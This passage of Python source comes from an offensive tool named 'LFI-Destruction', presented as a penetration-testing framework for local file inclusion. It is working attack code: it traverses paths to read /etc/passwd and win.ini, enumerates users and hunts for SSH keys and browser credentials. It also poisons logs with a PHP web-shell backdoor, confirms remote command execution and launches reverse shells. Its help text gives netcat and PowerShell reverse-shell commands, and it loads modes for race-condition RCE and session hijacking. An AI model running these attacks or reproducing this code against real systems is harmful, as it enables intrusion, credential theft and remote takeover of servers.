                self._print(f"[*] Loaded {len(log_paths)} custom log paths", 'info')
            except Exception as e:
                self._print(f"[-] Failed to load log files: {e}", 'error')

        log_paths.extend(self.LOG_PATHS.get(self.config['os_type'], []))

        if self.config['os_type'] == 'windows':
            encoded_paths = []
            for p in log_paths:
                p = re.sub(r'^[A-Za-z]:[\\/]', '', p)
                p = p.replace('\\', '/')
                parts = p.split('/')
                encoded_parts = [urllib.parse.quote(part, safe='') for part in parts]
                p = '/'.join(encoded_parts)
                encoded_paths.append(p)
            log_paths = list(set(encoded_paths))
        else:
            log_paths = list(set(log_paths))

        self._print(f"[*] Testing {len(log_paths)} log file paths", 'info')
        self._print(f"[*] Using injection vector: {self.config['log_vector']}", 'info')
        self._print(f"[*] Test token: {token}", 'debug')

        self._print(f"[*] Injecting test payload...", 'info')
        success = self.inject_log_payload(
            config['protocol'], config['host'], config['port'],
            config['base_url'], config['traversal_prefix'],
            php_test, config['verbose']
        )
        if not success:
            self._print("[-] Injection request failed. Check network/target.", 'error')
            return

        self._print("[*] Payload injected. Waiting 2 seconds for logs to flush...", 'info')
        time.sleep(2)

        found_log = None
        for log_path in log_paths:
            if self.try_include_log(
                config['protocol'], config['host'], config['port'],
                config['base_url'], config['traversal_prefix'],
                log_path, token,
                config['lfi_type'], config['param_name'],
                config['verbose']
            ):
                found_log = log_path
                break

        if not found_log:
            self._print("[-] No writable log file found with current injection vector.", 'warning')
            self._print("[*] Try a different vector (User-Agent, Referer, X-Forwarded-For, etc.)", 'info')
            return

        self._print(f"\n[+] Log poisoning successful! Writable log: {found_log}", 'success')
        self._print("[*] Injecting persistent PHP backdoor for command execution...", 'info')
        backdoor = "<?php system($_GET['cmd']); ?>"
        self.inject_log_payload(
            config['protocol'], config['host'], config['port'],
            config['base_url'], config['traversal_prefix'],
            backdoor, config['verbose']
        )

        self._print("[*] Testing backdoor with 'id' command...", 'info')
        test_cmd = "id" if self.config['os_type'] == 'linux' else "whoami"
        lfi_payload = config['traversal_prefix'] + found_log.lstrip('/')
        encoded = self.encode_payload(lfi_payload, self.config['encoding'], self.config['user_encoding'])
        if self.config['wrapper'] != 'none':
            encoded = self._apply_wrapper(encoded)

        if config['lfi_type'] == 'path':
            test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/') + f"?cmd={quote_plus(test_cmd)}"
        else:
            base = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
            if '?' in base:
                test_url = base + f"&cmd={quote_plus(test_cmd)}"
            else:
                test_url = base + f"?cmd={quote_plus(test_cmd)}"

        status, output = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                test_url, verbose=config['verbose'])
        if status == 200 and output and output.strip():
            self._print("[+] RCE confirmed! Backdoor is working.", 'success')
            self._print(f"[+] Command output:\n{output.strip()}", 'info')
            self.config['log_path'] = found_log
            self._attempt_reverse_shell(config, found_log)
        else:
            self._print("[-] Backdoor test failed. The log file may not be executable or system() is disabled.", 'error')
            self._print("[*] Try a different PHP function (e.g., shell_exec, passthru) or vector.", 'info')

    # =========================================================================
    #   MODULAR MODE LOADER – FOR MODES 3-5
    # =========================================================================
    def run_mode(self, mode_number: str, config: Dict):
        """
        Dynamically import and execute an external mode module.
        mode_number: '3', '4', or '5'
        config: the target configuration dict from interactive_setup()
        """
        mode_map = {
            '3': ('mode3_phpinfo_race', 'PHPInfo Race Condition RCE'),
            '4': ('mode4_upload_trigger', 'Uploaded File Trigger'),
            '5': ('mode5_session_grabber', 'PHP Session Enumeration')
        }
        
        if mode_number not in mode_map:
            self._print(f"[-] Unknown mode: {mode_number}", 'error')
            return
        
        module_name, description = mode_map[mode_number]
        try:
            # Dynamically import the mode module from the 'modes' package
            module = __import__(f'modes.{module_name}', fromlist=['run'])
            self._print(f"\n[*] Launching Mode {mode_number}: {description}", 'highlight')
            # Pass the fuzzer instance (self) and the config
            module.run(config, self)
        except ImportError as e:
            self._print(f"[-] Failed to load mode module '{module_name}': {e}", 'error')
            self._print("[*] Make sure the file exists in the 'modes/' directory.", 'info')
        except Exception as e:
            self._print(f"[-] Error during mode execution: {e}", 'error')
            if self.config.get('verbose'):
                import traceback
                traceback.print_exc()

    # -------------------------------------------------------------------------
    #   INTERACTIVE SETUP
    # -------------------------------------------------------------------------
    def show_banner(self):
        banner = f"""
{self.colors['banner']}{'='*70}
 LFI-Destruction v5.2 – Authorized Penetration Testing Tool
{'='*70}
 Written By RevShellXD
 Modes: 
   1) SSH / Browser Artifact Fuzzing (Linux/Windows)
   2) Log Poisoning & Reverse Shell (RCE via log file)
   3) PHPInfo Discovery + File Upload RCE (Race Condition)
   4) Uploaded File Trigger (LFI + existing shell)
   5) PHP Session Enumeration & Hijacking
{'='*70}{Style.RESET_ALL if COLORS else ''}
"""
        print(banner)

    def show_help(self):
        help_text = f"""
{self.colors['highlight']}USAGE:
  python3 LFI-Destruction.py [OPTIONS]

{self.colors['info']}BASIC INTERACTIVE:
  python3 LFI-Destruction.py

{self.colors['info']}ADVANCED MODE:
  python3 LFI-Destruction.py -adv

{self.colors['info']}COMMAND LINE FLAGS:
  --os {{linux,windows}}          Target OS
  --auto-depth                  Auto-detect traversal depth
  --wordlist FILE              Custom wordlist for artifact fuzzing (overrides OS default)
  --userlist FILE              Custom username list for Windows user discovery
  --beacon-file PATH           Custom beacon file for user verification (default: NTUSER.DAT)
  --custom-shell CMD           Custom reverse shell command (use {{lhost}} and {{lport}} as placeholders)
  --log-poisoning              Enable log poisoning mode (mode 2)
  --log-vector {{ua,referer,xff,header,param}}  Injection vector
  --log-header NAME            Custom header name
  --log-param NAME             Parameter name (for vector=param)
  --log-files FILE             Custom log path list
  --rce-command CMD            Test command (default: id/whoami)
  --output FILE                Save results to JSON

{self.colors['warning']}EXAMPLES:
  # SSH & browser artifact fuzzing (Linux)
  python3 LFI-Destruction.py

  # Windows dynamic user discovery + credential hunting
  python3 LFI-Destruction.py --os windows

  # Log poisoning with custom reverse shell (Linux)
  python3 LFI-Destruction.py --log-poisoning --log-vector ua --custom-shell "nc {{lhost}} {{lport}} -e /bin/bash"

  # Mode 3 – phpinfo race condition RCE (requires modes/mode3_phpinfo_race.py)
  python3 LFI-Destruction.py  # then select mode 3 interactively

{self.colors['error']}LEGAL DISCLAIMER:
  This tool is for authorized security testing only.
{Style.RESET_ALL if COLORS else ''}
"""
        print(help_text)

    def interactive_setup(self, args):
        self._print("\n[*] INITIAL CONFIGURATION", 'highlight')
        print("-" * 40)

        # --- OS Selection ---
        while True:
            os_choice = input("Target operating system? (linux/windows) [linux]: ").strip().lower()
            if not os_choice:
                self.config['os_type'] = 'linux'
                break
            if os_choice in ['linux', 'windows']:
                self.config['os_type'] = os_choice
                break
            self._print("Invalid choice. Enter 'linux' or 'windows'.", 'error')

        # --- Attack Mode Selection ---
        print("\nSelect attack mode:")
        print("1) SSH / Browser Artifact Fuzzing (keys, credentials, configs)")
        print("2) Log Poisoning & Reverse Shell (RCE via log file)")
        print("3) PHPInfo Discovery + File Upload RCE (Race Condition)")
        print("4) Uploaded File Trigger (LFI + existing shell)")
        print("5) PHP Session Enumeration & Hijacking")
        while True:
            mode = input("Choice (1-5): ").strip()
            if mode in ['1','2','3','4','5']:
                self.config['log_poisoning'] = (mode == '2')
                self.config['selected_mode'] = mode
                break
            self._print("Invalid choice. Enter 1-5.", 'error')

        # --- Advanced mode prompts (if -adv) ---
        if self.advanced_mode:
            self._print("\n[*] ADVANCED CONFIGURATION", 'highlight')
            print("-" * 40)

            print("\nLFI Injection Location:")
            print("1) Query Parameter (default)")
            print("2) Cookie")
            print("3) Header")
            loc_choice = input("Choice (1-3): ").strip()
            if loc_choice == '2':
                self.config['lfi_location'] = 'cookie'
                self.config['cookie_name'] = input("Cookie name: ").strip()
            elif loc_choice == '3':
                self.config['lfi_location'] = 'header'
                self.config['header_name'] = input("Header name: ").strip()

            if input("\nUse POST instead of GET? (y/N): ").strip().lower() == 'y':
                self.config['method'] = 'POST'
                self.config['post_param'] = input("POST parameter name: ").strip()

            print("\nPHP Wrapper Options:")
            print("0) None")
            print("1) php://filter (read source)")
            print("2) data:// (RCE)")
            print("3) expect:// (RCE)")
            wrap_choice = input("Choice (0-3): ").strip()
            if wrap_choice == '1':
                self.config['wrapper'] = 'php_filter'
            elif wrap_choice == '2':
                self.config['wrapper'] = 'php_data'
                self.config['rce_command'] = input("Command for data:// wrapper: ").strip()
            elif wrap_choice == '3':
                self.config['wrapper'] = 'expect'
                self.config['rce_command'] = input("Command for expect:// wrapper: ").strip()

            if input("\nAuto-detect traversal depth? (y/N): ").strip().lower() == 'y':
                self.config['auto_depth'] = True

            if self.config['selected_mode'] == '1' and not self.config['log_poisoning']:
                if input("\nUse custom wordlist for artifact fuzzing? (y/N): ").strip().lower() == 'y':
                    wl = input("Path to wordlist: ").strip()
                    if os.path.exists(wl):
                        self.config['wordlist'] = wl

        # --- Windows‑specific: custom username list & beacon file (only for mode 1) ---
        if self.config['selected_mode'] == '1' and self.config['os_type'] == 'windows':
            if input("\nUse custom username list for Windows user discovery? (y/N): ").strip().lower() == 'y':
                ul = input("Path to username list (one per line): ").strip()
                if os.path.exists(ul):
                    self.config['userlist'] = ul
                    self._print(f"[*] Will load custom usernames from {ul}", 'info')

            beacon_default = "NTUSER.DAT"
            beacon_input = input(f"\nBeacon file for user verification (default: {beacon_default}, 'none' to disable): ").strip()
            if beacon_input.lower() == 'none':
                self.config['beacon_file'] = None
                self._print("[*] Beacon file verification disabled", 'info')
            elif beacon_input:
                self.config['beacon_file'] = beacon_input
                self._print(f"[*] Using custom beacon file: {beacon_input}", 'info')
            else:
                self.config['beacon_file'] = beacon_default
                self._print(f"[*] Using default beacon file: {beacon_default}", 'info')

        # --- Log poisoning specific config (only for mode 2) ---
        if self.config['selected_mode'] == '2':
            self._print("\n[*] LOG POISONING CONFIGURATION", 'highlight')
            print("-" * 40)
            print("Select injection vector:")
            print("1) User-Agent")
            print("2) Referer")
            print("3) X-Forwarded-For")
            print("4) Custom header")
            print("5) Query parameter")
            vec_choice = input("Choice (1-5): ").strip()
            vectors = {'1': 'ua', '2': 'referer', '3': 'xff', '4': 'header', '5': 'param'}
            self.config['log_vector'] = vectors.get(vec_choice, 'ua')
            if self.config['log_vector'] == 'header':
                self.config['log_header'] = input("Header name: ").strip()
            if self.config['log_vector'] == 'param':
                self.config['log_param'] = input("Parameter name (default: 'test'): ").strip() or 'test'

            if input("\nUse custom log file list? (y/N): ").strip().lower() == 'y':
                lf = input("Path to log file list: ").strip()
                if os.path.exists(lf):
                    self.config['log_files'] = lf

            custom_shell = input("\nUse custom reverse shell payload? (y/N): ").strip().lower()
            if custom_shell == 'y':
                print("\nEnter your custom reverse shell command.")
                print("Use {lhost} and {lport} as placeholders (they will be replaced with your listener).")
                print("Example (Linux): nc {lhost} {lport} -e /bin/bash")
                print("Example (Windows): powershell -e <base64>")
                shell_cmd = input("Shell command: ").strip()
                if shell_cmd:
                    self.config['custom_reverse_shell'] = shell_cmd
                    self._print("[+] Custom reverse shell payload set.", 'success')
                else:
                    self._print("[-] No command entered – using default payload.", 'warning')
            else:
                self.config['custom_reverse_shell'] = None

            cmd = input("Test command to verify RCE (default: id/whoami): ").strip()
            self.config['rce_command'] = cmd if cmd else ('id' if self.config['os_type'] == 'linux' else 'whoami')

        # --- TARGET DETAILS (common for all modes) ---
        self._print("\n[*] TARGET CONFIGURATION", 'highlight')
        print("-" * 40)

        while True:
            proto = input("Enter protocol (http or https): ").strip().lower()
            if proto in ['http', 'https']:
                break
            self._print("Invalid protocol.", 'error')

        while True:
            port_str = input("Enter port (e.g., 80, 443): ").strip()
            if port_str.isdigit() and 1 <= int(port_str) <= 65535:
                port = int(port_str)
                break
            self._print("Invalid port.", 'error')

        target = input("Enter target IP or domain: ").strip()

        while True:
            lfi_type = input("Is the LFI a path segment or query parameter? (path/param): ").strip().lower()
            if lfi_type in ['path', 'param']:
                break
            self._print("Invalid LFI type.", 'error')

        if lfi_type == 'path':
            print("\nEnter the path from domain to vulnerable endpoint (e.g., 'home/cgi-bin'):")
            base_path = input("LFI base path: ").strip().rstrip('/')
            base_url = f"{proto}://{target}:{port}/{base_path}"
            param_name = None
        else:
            base_url = input("Enter full base URL (e.g., http://target/index.php): ").strip().rstrip('/')
            param_name = input("Enter LFI parameter name (e.g., 'file'): ").strip()

        verbose = input("\nEnable verbose output? (y/N): ").strip().lower() == 'y'

        if not self.config['auto_depth']:
            depth_str = input(f"Enter traversal depth (default: {self.config['traversal_depth']}): ").strip()
            if depth_str.isdigit():
                self.config['traversal_depth'] = int(depth_str)
        traversal_prefix = '../' * self.config['traversal_depth']

        # --- ENCODING ---
        print("\nSelect encoding type:")
        print("1) None (recommended for Windows)")
        print("2) Single encoding")
        print("3) Double encoding")
        print("4) Custom double (Apache 2.4.49/50)")
        print("5) Unicode encoding")
        print("6) Custom user encoding")
        while True:
            enc_choice = input("Choice (1-6): ").strip()
            enc_map = {'1': 'none', '2': 'single', '3': 'double',
                       '4': 'custom_double', '5': 'unicode', '6': 'user_custom'}
            encoding = enc_map.get(enc_choice)
            if encoding:
                break
            self._print("Invalid choice.", 'error')

        user_encoding = None
        if encoding == 'user_custom':
            user_encoding = input("Enter custom encoding string to replace '../': ").strip()

        # --- Windows encoding override (safe fallback) ---
        if self.config['os_type'] == 'windows' and encoding != 'none':
            self._print("\n[!] Windows target detected – forcing encoding to 'None'.", 'warning')
            self._print("    Your target accepts forward slashes; other encodings may break the URL.\n", 'warning')
            encoding = 'none'
            user_encoding = None

        self.config['encoding'] = encoding
        self.config['user_encoding'] = user_encoding

        if self.config['selected_mode'] == '1':
            maxd = input(f"\nMax recursive depth (default: {self.config['max_depth']}): ").strip()
            if maxd.isdigit():
                self.config['max_depth'] = int(maxd)

        return {
            'protocol': proto,
            'host': target,
            'port': port,
            'base_url': base_url,
            'lfi_type': lfi_type,
            'param_name': param_name,
            'verbose': verbose,
            'traversal_prefix': traversal_prefix,
            'encoding': encoding,
            'user_encoding': user_encoding,
            'max_depth': self.config['max_depth']
        }

    # -------------------------------------------------------------------------
    #   MAIN SCAN ROUTINE
    # -------------------------------------------------------------------------
    def run_scan(self, config: Dict, dry_run: bool = False):
        if dry_run:
            self._print("[*] DRY RUN MODE - No requests will be made", 'warning')
            self._print(f"Target OS: {self.config['os_type']}")
            self._print(f"Attack mode: {self.config['selected_mode']}")
            self._print(f"Target: {config['protocol']}://{config['host']}:{config['port']}")
            self._print(f"LFI Type: {config['lfi_type']}")
            self._print(f"Base URL: {config['base_url']}")
            if config.get('param_name'):
                self._print(f"Parameter: {config['param_name']}")
            self._print(f"Encoding: {config['encoding']}")
            self._print(f"Traversal Depth: {self.config['traversal_depth']}")
            return

        if self.config['auto_depth']:
            self._print("[*] Auto-detecting traversal depth...", 'info')
            self.config['traversal_depth'] = self.find_traversal_depth(config)
            config['traversal_prefix'] = '../' * self.config['traversal_depth']

        # -----------------------------------------------------------------
        #   MODE 1: SSH / BROWSER ARTIFACT FUZZING (UNCHANGED)
        # -----------------------------------------------------------------
        if self.config['selected_mode'] == '1':
            # Verify LFI
            if self.config['os_type'] == 'linux':
                test_file = 'etc/passwd'
                valid_str = 'root:x:0:0'
            else:
                test_file = 'Windows/win.ini'
                valid_str = '[fonts]'

            lfi_payload = config['traversal_prefix'] + test_file
            encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
            if self.config['wrapper'] != 'none':
                encoded = self._apply_wrapper(encoded)

            if config['lfi_type'] == 'path':
                test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                test_url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

            self._print(f"[*] Testing LFI with {test_file}...", 'info')
            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     test_url, verbose=config['verbose'])
            if status != 200 or not content or valid_str not in content:
                self._print(f"[-] LFI verification failed. HTTP {status}", 'error')
                if config['verbose'] and content:
                    self._print(f"Response preview: {content[:200]}", 'debug')
                return

            self._print("[+] LFI confirmed!", 'success')

            # ---------- USER ENUMERATION ----------
            if self.config['os_type'] == 'linux':
                users = self.parse_passwd(content)
                valid_users = [u for u in users if u['home'].startswith('/home/') or u['home'] == '/root']
                if not valid_users:
                    self._print("[-] No valid users with home directories found.", 'error')
                    return
                self._print(f"[+] Found {len(valid_users)} valid users:", 'success')
                for u in valid_users:
                    self._print(f"  • {u['username']}: {u['home']}", 'info')
            else:
                # Windows user discovery (unchanged)
                user_dirs = []
                users_path = config['traversal_prefix'] + 'Users/'
                if config['lfi_type'] == 'path':
                    enc_users = self.encode_payload(users_path, config['encoding'], config['user_encoding']).lstrip('/')
                    users_url = config['base_url'].rstrip('/') + '/' + enc_users
                else:
                    enc_users = self.encode_payload(users_path, config['encoding'], config['user_encoding'])
                    users_url = self._inject_lfi_payload(enc_users, config['base_url'], config['param_name'])

                status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                         users_url, verbose=config['verbose'])
                if status == 200 and self.is_directory_listing(content):
                    for fname in self.extract_filenames_from_listing(content):
                        if fname not in ['../', './', '..', '.'] and not fname.startswith('.'):
                            user_dirs.append(fname.strip('/'))
                    self._print(f"[*] Dynamically discovered {len(user_dirs)} Windows user folders", 'info')
                else:
                    self._print("[*] Could not enumerate users via directory listing.", 'warning')

                if not user_dirs:
                    if self.config.get('userlist'):
                        try:
                            with open(self.config['userlist'], 'r', encoding='utf-8', errors='ignore') as f:
                                user_dirs = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                            self._print(f"[*] Loaded {len(user_dirs)} usernames from custom list", 'info')
                        except Exception as e:
                            self._print(f"[-] Failed to load userlist: {e}", 'error')

                    if not user_dirs:
                        user_dirs = self.WINDOWS_USER_FALLBACK
                        self._print(f"[*] Using fallback list of {len(user_dirs)} common usernames", 'info')

                valid_users = [{'username': u, 'home': f'Users/{u}/'} for u in user_dirs]
                self._print(f"[*] Will scan {len(valid_users)} Windows user profiles")

                # Beacon verification
                if self.config.get('beacon_file'):
                    self._print("[*] Performing beacon file verification for user existence...")
                    beacon = self.config['beacon_file']
                    verified_users = []
                    for user in valid_users:
                        beacon_path = config['traversal_prefix'] + user['home'] + beacon
                        if config['lfi_type'] == 'path':
                            enc_beacon = self.encode_payload(beacon_path, config['encoding'], config['user_encoding']).lstrip('/')
                            beacon_url = config['base_url'].rstrip('/') + '/' + enc_beacon
                        else:
                            enc_beacon = self.encode_payload(beacon_path, config['encoding'], config['user_encoding'])
                            beacon_url = self._inject_lfi_payload(enc_beacon, config['base_url'], config['param_name'])

                        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                                 beacon_url, verbose=config['verbose'])
                        content_not_found = any(p in content for p in self.NOT_FOUND_PATTERNS)
                        if status == 404 or content_not_found:
                            if config['verbose']:
                                self._print(f"[-] Skipping {user['username']}: beacon file not found (status {status})", 'debug')
                            continue
                        else:
                            verified_users.append(user)
                            if config['verbose']:
                                self._print(f"[+] Verified user {user['username']} (beacon status {status}, content length {len(content)})", 'debug')

                    self._print(f"[*] Beacon verification complete: {len(verified_users)} users confirmed")
                    valid_users = verified_users
                else:
                    self._print("[*] Beacon file verification disabled – using home directory check only")

            # ---------- SELECT ARTIFACT WORDLIST ----------
            if self.config['wordlist']:
                try:
                    with open(self.config['wordlist'], 'r', encoding='utf-8', errors='ignore') as f:
                        suffixes = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self._print(f"[+] Loaded {len(suffixes)} paths from custom wordlist", 'success')
                except Exception as e:
                    self._print(f"[-] Failed to load wordlist: {e}", 'error')
                    suffixes = self.LINUX_ARTIFACTS if self.config['os_type'] == 'linux' else self.WINDOWS_ARTIFACTS
            else:
                if self.config['os_type'] == 'linux':
                    suffixes = self.LINUX_ARTIFACTS
                    self._print(f"[*] Using built-in Linux artifact wordlist ({len(suffixes)} paths)", 'info')
                else:
                    suffixes = self.WINDOWS_ARTIFACTS
                    self._print(f"[*] Using built-in Windows artifact wordlist ({len(suffixes)} paths)", 'info')

            # ---------- START FUZZING ----------
            self._print(f"\n[*] Starting artifact fuzzing for {len(valid_users)} users...", 'info')
            for user in valid_users:
                if self.config['os_type'] == 'linux':
                    home = user['home']
                    if not home.endswith('/'):
                        home += '/'
                    clean_home = home.lstrip('/')
                else:
                    home = user['home']
                    clean_home = home.lstrip('/')

                # Home directory check (skip if beacon verified)
                if self.config['os_type'] == 'windows' and self.config.get('beacon_file'):
                    if config['verbose']:
                        self._print(f"[DEBUG] Skipping home directory check for {user['username']} (beacon verified)", 'debug')
                else:
                    home_path = config['traversal_prefix'] + clean_home
                    if not home_path.endswith('/'):
                        home_path += '/'

                    if config['lfi_type'] == 'path':
                        enc_home = self.encode_payload(home_path, config['encoding'], config['user_encoding']).lstrip('/')
                        home_url = config['base_url'].rstrip('/') + '/' + enc_home
                    else:
                        enc_home = self.encode_payload(home_path, config['encoding'], config['user_encoding'])
                        home_url = self._inject_lfi_payload(enc_home, config['base_url'], config['param_name'])

                    status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                             home_url, verbose=config['verbose'])
                    content_not_found = any(p in content for p in self.NOT_FOUND_PATTERNS)
                    if status == 404 or content_not_found:
                        if config['verbose']:
                            self._print(f"[-] Skipping {user['username']}: home directory not found (status {status})", 'debug')
                        continue

                self._print(f"[*] Scanning user {user['username']}...", 'info')
                visited = set()

                for suffix in suffixes:
                    suffix_clean = suffix.lstrip('/')
                    full_path = config['traversal_prefix'] + clean_home + suffix_clean
                    self.recursive_fuzz(
                        config['protocol'], config['host'], config['port'],
                        config['base_url'], config['encoding'], config['user_encoding'],
                        user['username'], full_path, 0, config['max_depth'], visited,
                        config['lfi_type'], config['param_name'], config['verbose']
                    )

                ssh_dir = config['traversal_prefix'] + clean_home + '.ssh/'
                self.recursive_fuzz(
                    config['protocol'], config['host'], config['port'],
                    config['base_url'], config['encoding'], config['user_encoding'],
                    user['username'], ssh_dir, 0, config['max_depth'], visited,
                    config['lfi_type'], config['param_name'], config['verbose']
                )

            self._print("\n" + "=" * 60, 'highlight')
            self._print("[*] ARTIFACT FUZZING COMPLETE", 'highlight')
            self._print(f"Total requests: {self.request_count}", 'info')
            self._print(f"Artifacts found: {len(self.found_artifacts)}", 'success' if self.found_artifacts else 'info')

        # -----------------------------------------------------------------
        #   MODE 2: LOG POISONING & RCE (UNCHANGED)
        # -----------------------------------------------------------------
        elif self.config['selected_mode'] == '2':
            # Verify LFI
            if self.config['os_type'] == 'linux':
                test_file = 'etc/passwd'
                valid_str = 'root:x:0:0'
            else:
                test_file = 'Windows/win.ini'
                valid_str = '[fonts]'

            lfi_payload = config['traversal_prefix'] + test_file
            encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
            if self.config['wrapper'] != 'none':
                encoded = self._apply_wrapper(encoded)

            if config['lfi_type'] == 'path':
                test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                test_url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

            self._print(f"[*] Verifying LFI with {test_file}...", 'info')
            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     test_url, verbose=config['verbose'])
            if status != 200 or not content or valid_str not in content:
                self._print(f"[-] LFI verification failed. Cannot include log files.", 'error')
                return
            self._print("[+] LFI confirmed, proceeding with log poisoning...", 'success')

            self.fuzz_log_poisoning(config, dry_run)

        # -----------------------------------------------------------------
        #   MODES 3-5: DELEGATE TO EXTERNAL MODULES
        # -----------------------------------------------------------------
        elif self.config['selected_mode'] in ['3', '4', '5']:
            self.run_mode(self.config['selected_mode'], config)

        else:
            self._print("[-] Invalid mode selected.", 'error')


def main():
    parser = argparse.ArgumentParser(description='LFI Exploitation Framework', add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    parser.add_argument('-adv', '--advanced', action='store_true', help='Enable advanced mode')
    parser.add_argument('--os', choices=['linux', 'windows'], help='Target OS')
    parser.add_argument('--auto-depth', action='store_true', help='Auto-detect traversal depth')
    parser.add_argument('--wordlist', type=str, help='Custom wordlist for artifact fuzzing (overrides OS default)')
    parser.add_argument('--userlist', type=str, help='Custom username list for Windows user discovery')
    parser.add_argument('--beacon-file', type=str, default='NTUSER.DAT', help='Custom beacon file for user verification')
    parser.add_argument('--custom-shell', type=str, help='Custom reverse shell command (use {lhost} and {lport} as placeholders)')
    parser.add_argument('--log-poisoning', action='store_true', help='Enable log poisoning mode (mode 2)')
    parser.add_argument('--log-vector', choices=['ua', 'referer', 'xff', 'header', 'param'], help='Log injection vector')
    parser.add_argument('--log-header', type=str, help='Custom header name (log vector=header)')
    parser.add_argument('--log-param', type=str, help='Parameter name (log vector=param)')
    parser.add_argument('--log-files', type=str, help='Custom log path list')
    parser.add_argument('--rce-command', type=str, default='id', help='Test command for RCE verification')
    parser.add_argument('--proxy', type=str, help='Proxy URL')
    parser.add_argument('--rate', type=float, help='Rate limit (seconds)')
    parser.add_argument('--output', type=str, help='Save results to JSON')
    parser.add_argument('--dry-run', action='store_true', help='Dry run')
    parser.add_argument('--no-color', action='store_true', help='Disable colors')

    args = parser.parse_args()

    if args.help:
        fuzzer = LFI_SSH_Fuzzer()
        fuzzer.show_help()
        sys.exit(0)

    fuzzer = LFI_SSH_Fuzzer(advanced_mode=args.advanced)

    if args.no_color:
        global COLORS
        COLORS = False
        fuzzer.colors = {k: '' for k in fuzzer.colors}

    # Apply command line overrides
    if args.os:
        fuzzer.config['os_type'] = args.os
    if args.auto_depth:
        fuzzer.config['auto_depth'] = True
    if args.wordlist:
        fuzzer.config['wordlist'] = args.wordlist
    if args.userlist:
        fuzzer.config['userlist'] = args.userlist
    if args.beacon_file:
        fuzzer.config['beacon_file'] = args.beacon_file
    if args.custom_shell:
        fuzzer.config['custom_reverse_shell'] = args.custom_shell
    if args.log_poisoning:
        fuzzer.config['log_poisoning'] = True
        fuzzer.config['selected_mode'] = '2'   # force mode 2 if flag is used
    if args.log_vector:
        fuzzer.config['log_vector'] = args.log_vector
    if args.log_header:
        fuzzer.config['log_header'] = args.log_header
    if args.log_param:
        fuzzer.config['log_param'] = args.log_param
    if args.log_files:
        fuzzer.config['log_files'] = args.log_files
    if args.rce_command:
        fuzzer.config['rce_command'] = args.rce_command
    if args.proxy:
        fuzzer.config['proxy'] = args.proxy
    if args.rate:
        fuzzer.config['rate_limit'] = args.rate

    fuzzer.show_banner()

    # If log_poisoning flag is set, skip interactive mode selection
    if args.log_poisoning:
        # We still need target config, but mode is already set
        config = fuzzer.interactive_setup(args)  # This will prompt for target details
        fuzzer.run_scan(config, dry_run=args.dry_run)
    else:
        config = fuzzer.interactive_setup(args)
        fuzzer.run_scan(config, dry_run=args.dry_run)

    if args.output and not args.dry_run:
        fuzzer.save_results(args.output)
    elif not args.dry_run and fuzzer.found_artifacts:
        if input("\nSave results to file? (y/N): ").strip().lower() == 'y':
            fname = input("Filename (default: scan_results.json): ").strip()
            fuzzer.save_results(fname if fname else None)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        if '--verbose' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)
